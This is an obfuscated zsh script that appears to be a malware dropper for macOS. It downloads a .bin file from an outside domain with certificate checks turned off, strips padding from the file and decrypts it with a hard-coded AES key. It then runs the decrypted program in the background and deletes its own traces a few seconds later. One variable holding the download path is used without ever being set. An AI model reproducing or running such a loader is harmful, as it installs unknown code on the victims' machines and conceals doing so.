#!/bin/zsh
nwsja=$(mktemp /tmp/bzg6pv.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/mb837b66ac1d65528.bin" -o "$nwsjaz" || exit 1
ufsszx=$(stat -f %z "$nwsjaz"); nss7qpm=$(( ufsszx - 1911 - 1108 ))
tail -c +$(( 1911 + 1 )) "$nwsjaz" | head -c $nss7qpm | openssl enc -d -aes-256-cbc -k afe8302523052f99659f799b -out "$nwsja" 2>/dev/null
[ -s "$nwsja" ] && chmod 700 "$nwsja" && ( "$nwsja" & ) && disown
( sleep 3; rm -f "$nwsja" "$nwsjaz" ) &>/dev/null &
